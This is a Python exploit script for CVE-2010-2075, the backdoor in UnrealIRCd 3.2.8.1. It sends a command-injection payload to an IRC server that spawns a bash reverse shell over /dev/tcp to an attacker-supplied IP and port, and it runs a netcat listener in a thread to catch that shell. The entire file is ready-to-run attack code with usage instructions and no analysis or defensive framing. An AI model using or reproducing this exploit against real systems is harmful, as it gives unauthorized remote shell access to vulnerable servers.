#!/bin/usr/python3

# CVE-2010-2075 UnrealIrcd 3.2.8.1 exploit rebuild by 0bfxgh0st*

import socket, sys, os, threading

def help():

	print ("CVE-2010-2075")
	print ("UnrealIrcd 3.2.8.1 exploit")
	print ("Usage python3 cve-2010-2075.py <attackerip> <attackerport> <ircserverip> <ircserverport>")

try:

	attacker_ip=sys.argv[1]
	attacker_port=sys.argv[2]
	irc_ip=sys.argv[3]
	irc_port=sys.argv[4]
	p = 'AB;bash -c "bash -i >& /dev/tcp/' + attacker_ip + '/' + attacker_port + ' 0>&1;"'
	ep = bytes(p, 'utf-8')

except:

	help()
	sys.exit()

def exploit():

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((irc_ip,int(irc_port)))
		s.sendall(ep)
		data = s.recv(1024)
		print(data.decode('utf-8'))

def nc():

	print ("Exploiting...")
	os.system('nc -lvp ' + attacker_port)

c = threading.Thread(target=nc)
c.start()
exploit()
